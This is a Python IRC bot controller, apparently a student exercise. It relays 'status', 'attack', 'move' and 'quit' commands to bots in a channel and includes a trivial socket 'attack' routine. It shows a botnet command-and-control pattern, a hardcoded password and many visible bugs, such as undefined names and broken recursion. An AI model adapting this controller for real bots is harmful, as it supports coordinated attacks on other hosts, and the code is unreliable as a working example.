import socket
import time
import irc
import random
import string
import sys
import threading

#HOST = ""              # the Twitch IRC server
#PORT = 1234                         # always use port 6667!
NICK = "conbot"            # your Twitch username, lowercase
PASS = "pwiscpsc1234" # your Twitch OAuth token
#CHAN = "testg"                   # the channel you want to join
comList = ["status","attack","move","quit","shutdown"]

errorList = [ "402","403","431","432",'433',"436","437","461","465","471","473","474","475"]

class inputThread(threading.Thread):
    def __init__(self):
        self.commandList = ["status","attack","move","quit","shutdown"] 
        self.command = "initial"
        threading.Thread.__init__ (self)
        
        
    def run(self):        
        
        #while True:
        time.sleep(5)
        userCommand = ''
        try:            
            userCommand = input("Please enter a valid command:")
            if(userCommand not in self.commandList):
                raise ValueError
            else:
                self.command = userCommand.split()
        except ValueError:
            self.run(cBot)
        
        
class conBot(threading.Thread):
    def __init__(self, nick, host, port, chan, phrase):
        self.chan = chan 
        self.host = host
        self.port = port
        self.NICK = nick
        self.activationPhrase = phrase
        self.command = ["initial Command"]
        self.inThread = threading.Thread(target = inputThread)
        self.comList = ["status","attack","move","quit","shutdown"]
        threading.Thread.__init__ ( self ) 
        
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.s.connect((self.host, self.port)) 
        
        except Exception as e:
            #time.sleep(5)
            self.s.connect((self.host,self.port))           
        
        self.counter = 0
        
        self.controller = ""
        self.gameOn = False
        self.inputThread.run()
        self.connection()
        
    def createNick(self, nick):
        self.NICK = nick + ''.join(random.choice(string.ascii_lowercase) for i in range(5))       
        
        
    def connectIRC(self, s, nick, CHAN):         
        s.send("USER {} {} {} {}:Test\n".format(nick,nick,nick,nick).encode("utf-8"))
        s.send("NICK {}\r\n".format(nick).encode("utf-8"))
        s.send("JOIN {}\r\n".format(CHAN).encode("utf-8"))
        self.NICK = nick
        
    def moveIRC(self,s,CHAN):
        s.send("USER {} {} {} {}:Test\n".format(self.NICK,self.NICK,self.NICK,self.NICK).encode("utf-8"))
        s.send("NICK {}\r\n".format(self.NICK).encode("utf-8"))
        s.send("JOIN {}\r\n".format(CHAN).encode("utf-8"))
    
    def attack(self, h, p):
        sock = socket.socket()
        sock.connect((h,int(p)))
        sock.send("{} {}\r\n".format(self.counter,self.NICK).encode("utf-8"))
        sock.close()
        self.counter = self.counter + 1
    
    def move(self, host, port, chan):
        self.host = host
        self.port = int(port)
        self.chan = chan
        self.s.shutdown(socket.SHUT_RDWR)
        self.s.close()
        print("line 52")
        print(self.host)
        print(self.port)
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.connect((self.host,self.port))
        self.moveIRC(self.s,self.chan)
        
    def setController(self, prefix):
        arguments = prefix.split("!~")
        self.controller = arguments[0]
            
    def parseController(self,prefix):
        arguments = prefix.split("!~")
        return arguments[0]
    
    def parsemsg(self,s):
        """Breaks a message from an IRC server into its prefix, command, and arguments.
        """
        prefix = ''
        trailing = []
        if not s:
            raise IRCBadMessage("Empty line.")
        if s[0] == ':':
            prefix, s = s[1:].split(' ', 1)
        if s.find(' :') != -1:
            s, trailing = s.split(' :', 1)
            args = s.split()
            args.append(trailing)
        else:
            args = s.split()
        command = args.pop(0)
        return prefix, command, args
        
    def inputTest(self): 
        while True:        
            time.sleep(5)
            userCommand = ''
            try:            
                userCommand = input("Please enter a valid command:")
                if(userCommand not in self.comList):
                    raise ValueError
                else:
                    lock = threading.Lock()
                    with lock:
                        self.command = userCommand.split()
            except ValueError:
                    self.run(cBot)
                
    def processCommand(self):
        print("command = ")
        print(self.command[0])
        if(self.command[0] == self.activationPhrase):
            self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, self.command[0]).encode("utf-8"))
            #self.command = grabInput(self.comList)
            #self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command[0]).encode("utf-8"))
        elif(self.command[0] == "status") :                    
            self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command[0]).encode("utf-8"))    
        elif(self.command[0] == "attack"):
            attackHost = self.command[1]
            attackPort = self.command[2]
            #self.command = grabInput(self.comList)
            #:simdevs!~simdevs@136.159.160.155 PRIVMSG #simdevs :!attack localhost 7788
            self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command).encode("utf-8"))

    def connection(self):
    
        self.connectIRC(self.s,self.NICK,self.chan)
        #self.activationPhrase = PHRASE
        self.comList.append(self.activationPhrase)
        getInput = True
        print("Connected to IRC...")
        count =0
        #threads = []
        
        #def grabInput(commandList):        
        #    userCommand = ''
        #    try:            
        #        userCommand = input("Please enter a valid command:")
        #        testing = userCommand.split()[0]
        #        print(testing)
        #        if(testing not in commandList):
        #            raise ValueError 
        #    except ValueError:
        #        grabInput(commandList)
        #    return userCommand.split()
        #try:
        #    inThread = threading.Thread(target = grabInput,args=(comList,))
        #    
        #    inThread.start(1)
        #try:
        #    # now threading1 runs regardless of user input
        #    inThread = inputThread()
        #    inThread.daemon = True
        #    inThread.start()
        #    #threads.append(inThread)
        #except Exception as b:
        #    print("Exception b =" + str(b))
            
        isConnected = False
            
        try:
            while getInput:
                self.processCommand()
                response = self.s.recv(1024).decode("utf-8")
                (prefix, command, args) = self.parsemsg(response)            
                #count = count + 1
                print((prefix,command,args))
                if(command =='353'):
                    #print("line 170")
                    #self.inThread =  threading.Thread(target = self.inputTest)
                    #self.inThread.start()
                    #print("line 173")
                    #isConnected = True
                #if(self.command != ""):
                #    isConnected = True
                #    print("line 193")
                                
                    
                #print(count)
                #if command == "PRIVMSG":
                #        test = args[1].split()
                        #if args[0] == self.chan and args[1].split()[0] == self.activationPhrase:
                #            self.setController(prefix)
                #            self.gameOn = True
                #            print("GameON")
                #            print(self.controller)
                #        if args[0] == self.chan and args[1].split()[0] == "!status":
                #            if(self.gameOn and (self.parseController(prefix) == self.controller)):
                #                self.s.send("PRIVMSG {} : {}\r\n".format(self.controller, self.NICK).encode("utf-8"))
                #        if args[0] == self.chan and args[1].split()[0] == "!attack":
                #            if(self.gameOn and (self.parseController(prefix) == self.controller)):
                #                attackhost = args[1].split()[1].strip()
                #                attackPort = args[1].split()[2].strip()
                #                self.s.send("PRIVMSG {} : I will attack you\r\n".format(self.controller).encode("utf-8"))
                #                self.attack(attackhost,attackPort)                    
                #        if args[0] == self.chan and args[1].split()[0] == "!move":
                #            if(self.gameOn and (self.parseController(prefix) == self.controller)):
                #                self.s.send("QUIT : pz out\r\n".encode("utf-8"))
                #                newHost = args[1].split()[1].strip()
                #                newPort = args[1].split()[2].strip()
                #                newChan = args[1].split()[3].strip()
                #                self.move(newHost,newPort,newChan)
                #elif command == "KICK" :
                #    self.connectIRC(self.s,self.NICK, self.chan)                              
                #elif command == "PING":
                #    self.s.send("PONG {}: :\r\n".format(prefix).encode("utf-8"))            
                #elif command = '433':
                #    print("line 161")
                #    self.createNick(NICK)
                #    self.connectIRC(self.s,self.NICK, self.chan)   
                #if(isConnected):
                #    #self.command = grabInput(self.comList) 
                #    print("command = ")
                #    print(self.command)
                #    if(self.command[0] == self.activationPhrase):
                #        self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, self.command).encode("utf-8"))
                #        self.command = grabInput(self.comList)
                #        self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command[0]).encode("utf-8"))
                #    elif(self.command[0] == "status") :                    
                #        self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command[0]).encode("utf-8"))    
                #    elif(self.command[0] == "attack"):
                #        attackHost = self.command[1]
                #        attackPort = self.command[2]
                #        #self.command = grabInput(self.comList)
                #        #:simdevs!~simdevs@136.159.160.155 PRIVMSG #simdevs :!attack localhost 7788
                #        self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command).encode("utf-8"))
                        
        except Exception as e:
            print("Exception: ")
            print(e)
            print("Reconnecting in 5 seconds ...")
            time.sleep(5)
            connection()
        

def main():
        
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    CHAN = "#" + sys.argv[3]
    PHRASE = sys.argv[4]
    
    cBot = conBot(NICK,HOST,PORT,CHAN,PHRASE)
    cBot.start()  
    #time.sleep(5)
    #inThread =  threading.Thread(cBot.inputTest)
    #inThread.start()
    #cBot.inThread.run(cBot)
    print("line 248")
    
    
    
    
    
    
            
            

if __name__ == '__main__':
    main()


        
